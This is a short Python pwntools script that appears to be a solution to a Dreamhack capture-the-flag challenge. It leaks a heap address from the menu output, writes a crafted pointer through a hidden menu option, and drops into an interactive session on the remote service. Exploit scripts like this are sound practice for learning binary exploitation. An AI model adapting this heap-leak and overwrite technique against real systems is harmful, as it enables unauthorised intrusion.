from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22974
r = remote(HOST, PORT)

def secret(buf, size):
    r.sendlineafter(b'>> ', b'%d'%0x22222)
    r.sendlineafter(b': ', str(buf).encode())
    r.sendlineafter(b': ', str(size).encode())

def study_bunker(course):
    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b'>> ', str(course).encode())

def build_hatchery(payload):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b'>> ', payload)

study_bunker(0)

r.sendlineafter(b'>> ', b'2')
r.recvuntil(b'your buffer: ')
heap=int(r.recvline().strip().decode(),16)-0x10
r.sendlineafter(b'>> ', b'1')

type = heap+0x478
secret(type, 100)
study_bunker(0)
payload = p64(type+8) + b'22222\x00'

r.sendlineafter(b'>>', b'1')
r.sendline(payload)

r.interactive()